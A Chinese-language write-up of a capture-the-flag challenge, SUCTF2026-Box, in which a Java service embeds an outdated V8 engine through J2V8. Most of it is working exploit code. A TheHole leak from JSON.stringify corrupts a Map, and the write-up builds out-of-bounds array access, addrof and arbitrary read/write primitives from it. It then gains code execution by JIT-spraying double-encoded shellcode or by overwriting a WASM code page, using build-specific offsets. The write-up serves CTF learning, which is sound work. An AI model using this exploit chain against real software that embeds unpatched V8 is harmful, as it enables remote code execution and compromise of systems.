# SUCTF2026-Box

## 题目简述

附件表面上是 Java 程序，实际通过 [J2V8](https://github.com/eclipsesource/J2V8) 在 JVM 内嵌 V8。`App.java` 最多读取 1 MiB JavaScript，以单独一行 `EOF` 结束，只向脚本注册一个 `log()` 回调，然后调用 `v8.executeScript()`。

宿主没有暴露 Java 对象、反射、`require` 或 Nashorn 风格接口，常规 Java 沙箱逃逸不是主线。J2V8 JNI 库报告的 V8 版本是 `9.3.345.11`，又因项目没有及时吸收 V8 安全修复而保留 TheHole 利用链：从 `JSON.stringify` 异常中泄漏 V8 内部 `TheHole` 哨兵，用它破坏 `Map` 元数据、制造数组 OOB，再构造 `addrof` 和任意 V8 heap 读写，最终通过 JIT spray 或 WASM 代码页执行读取 `/flag` 的 shellcode。

## 解题过程

### 1. 确认引擎版本和编译参数

JAR 中的包名为 `com.eclipsesource.v8`，对应 J2V8。可以用库自身的接口确认版本：

```java
import com.eclipsesource.v8.V8;

public class Main {
    public static void main(String[] args) {
        System.out.println(V8.getV8Version());
    }
}
```

输出为：

```text
9.3.345.11
```

V8 利用不仅依赖版本，也依赖构建选项。题目源码和 J2V8 对应提交的 [`linux-x64/args.gn`](https://github.com/eclipsesource/J2V8/blob/00dddaa31a80782abbe93c4a01f325db3c4975d6/v8/linux-x64/args.gn) 给出：

```text
target_os = "linux"
target_cpu = "x64"
is_debug = false
is_component_build = false
v8_monolithic = true
v8_use_external_startup_data = false
v8_enable_i18n_support = false
v8_enable_pointer_compression = false
```

最重要的是未启用 pointer compression；这个时代的构建也没有现代 V8 sandbox，因此 heap 中保留大量可直接利用的 64 位指针。调试版应沿用这些选项，只额外打开符号、反汇编、对象打印和 heap verify，避免因构建差异得到错误对象布局。

### 2. TheHole 漏洞的真实作用

触发函数构造极深、极大的 JSON 序列化对象，使 `JSON.stringify` 进入异常路径：

```javascript
function trigger() {
    const a = [], b = [];
    const s = '"'.repeat(0x800000);
    a[20000] = s;
    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }
    throw new Error("failed to trigger");
}
```

捕获到的并非普通 JS 值，而是 V8 内部用来标记“空槽/已删除项”的 `TheHole`。利用代码把它作为 `Map` key：

```javascript
const hole = trigger();
const map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);
```

`Map` 自己也用 TheHole 标记已删除 entry。旧版允许用户把同一个哨兵作为 key 再次删除，导致 `number_of_elements` / `number_of_deleted_elements` 与真实表内容失配；后续扩容、rehash 和插入可破坏相邻对象元数据。

V8 的[上游安全修复](https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/)正是在 `Map/Set/WeakMap/WeakSet.prototype.delete` 前加入检查，拒绝 `TheHoleConstant()`。题目中的 J2V8 V8 版本早于该修复，所以这条已公开的浏览器 n-day 在嵌入式组件中仍可利用。

### 3. 官方布局：从损坏的 Map 得到 OOB

先准备 64 位整数与 double 的无损转换：

```javascript
const conv = new ArrayBuffer(8);
const f64 = new Float64Array(conv);
const u64 = new BigUint64Array(conv);

function ftoi(value) {
    f64[0] = value;
    return u64[0];
}

function itof(value) {
    u64[0] = value;
    return f64[0];
}
```

官方 exp 在损坏 Map 后进行如下布局：

```javascript
map.set(20, -1);
const oob_arr = [1.1];
const tmp_arr = [2.2];
const rw_arr = [3.3];
const obj_arr = [0xeada, rw_arr];
map.set(0x41414145, 0);
```

在题目构建中，损坏的集合操作把 `oob_arr.length` 扩大，使它能覆盖后续数组的 elements 指针。官方调试得到：

```text
oob_arr[0x16] → obj_arr.elements 相关槽位
oob_arr[0x11] → rw_arr.elements 相关槽位
```

这些索引不是 CVE 固有常量，而是当前堆布局的结果；更换数组创建顺序、V8 build 或 GC 状态后必须重新定位。

### 4. 构造地址泄漏和任意读写

官方原语如下：

```javascript
function addrof(obj) {
    obj_arr[1] = obj;
    return ftoi(oob_arr[0x16]);
}

function aar(addr) {
    oob_arr[0x11] = itof(addr - 0x10n);
    return ftoi(rw_arr[0]);
}

function aaw(addr, value) {
    oob_arr[0x11] = itof(addr - 0x10n);
    rw_arr[0] = itof(value);
}
```

`addrof` 返回的是 tagged pointer，使用对象本体地址时要根据该字段语义去掉低位 tag。`aar/aaw` 中的 `-0x10` 则是伪造 FixedDoubleArray elements 指针时对 header 的补偿，不等同于 tagged pointer 的 `-1`。

参赛队为提高稳定性采用四数组布局，OOB 索引为：

```text
oob_arr[20] → victim_arr.elements
oob_arr[21] → victim_arr.length
oob_arr[52] → obj_arr.elements
oob_arr[53] → obj_arr.length
```

它在每次读写后恢复上述四个字段。这个动作很重要：任意读写期间临时伪造的 elements 指针若跨过 GC、对象访问或后续 JIT 阶段仍未恢复，V8 很容易在扫描对象时崩溃。

### 5. 官方路线：JIT spray 劫持代码入口

官方 exp 把机器码编码成若干 double 常量，并反复调用函数促使 TurboFan 生成包含这些常量的可执行代码：

```javascript
const sprayed = () => [
    1.9553825422107533e-246,
    1.9560612558242147e-246,
    1.9995714719542577e-246,
    1.9533767332674093e-246,
    2.6348604765229606e-284,
];

for (let i = 0; i < 80000; i++) {
    sprayed();
    sprayed();
}
```

随后读取 JSFunction 的代码字段，并把入口改到 JIT 代码中经过对齐的 shellcode 位置：

```javascript
const function_addr = addrof(sprayed);
const code_addr = aar(function_addr + 0x30n);
const shellcode_entry = code_addr + 0xcdn - 0x5fn;
aaw(function_addr + 0x30n, shellcode_entry);
sprayed();
```

`+0x30`、`+0xcd-0x5f` 都绑定 V8 9.3.345.11 和这段喷射代码。应在调试版中反汇编生成的 code object，确认入口确实落到 double 常量承载的指令序列。最终 shellcode 执行 `open("/flag") → read → write(1, ...)`。

### 6. 参赛队路线：改写 WASM 代码页

另一种做法是实例化导出函数 `main` 的最小 WASM 模块，通过 `addrof` 得到 `WebAssembly.Instance` 地址，再读取 NativeModule/代码页指针。参赛队对题目构建确认：

```javascript
const inst_addr = addrof(wasm_instance) - 1n;
const rwx = heap_read64(inst_addr + 0x80n);
```

这里 `rwx` 指向代码页基址，但 `wasm_entry()` 最终执行的函数体位于该页 `+0x500`。利用必须先让函数完成 materialize/finalize：

```javascript
for (let i = 0; i < 0x1000; i++) {
    wasm_entry();
}

writeBytes64(rwx + 0x500n, shellcode);
restore_layout();
wasm_entry();
```

如果过早 patch，后续 WASM 编译/终结阶段会用原始机器码重新覆盖该页。先 warm-up、再写入、立即恢复数组布局、最后调用，是这条路线稳定的关键。shellcode 同样直接打开 `/flag`、读取并写到 stdout。

### 7. 执行结果

向服务发送 JavaScript 后，以单独一行结束：

```text
EOF
```

成功输出：

```text
SUCTF{y0u_kn@w_v8_p@tch_gap_we1!}
```

## 方法总结

这题不是 Java 反射逃逸，而是嵌入式 V8 的 patch gap。首轮应先识别 J2V8、获取精确 V8 版本和编译参数，再判断公开 V8 漏洞是否仍未修复。这里 `JSON.stringify` 只负责把内部 TheHole 泄漏到 JavaScript；真正把它变成内存破坏的是旧版集合实现允许 TheHole 进入 `Map.delete`，从而损坏哈希表计数并制造数组 OOB。

获得 OOB 后，官方用 JIT spray 改写 JSFunction 代码入口，参赛队用 WASM 实例定位可执行代码页。两条路线都高度依赖当前 build 的对象字段和代码偏移，不能只按版本号照抄。调试时应保持 release build 的 pointer-compression 等关键参数一致，并在临时篡改 elements 指针后及时恢复布局，才能避免 GC 或后续编译阶段破坏利用状态。
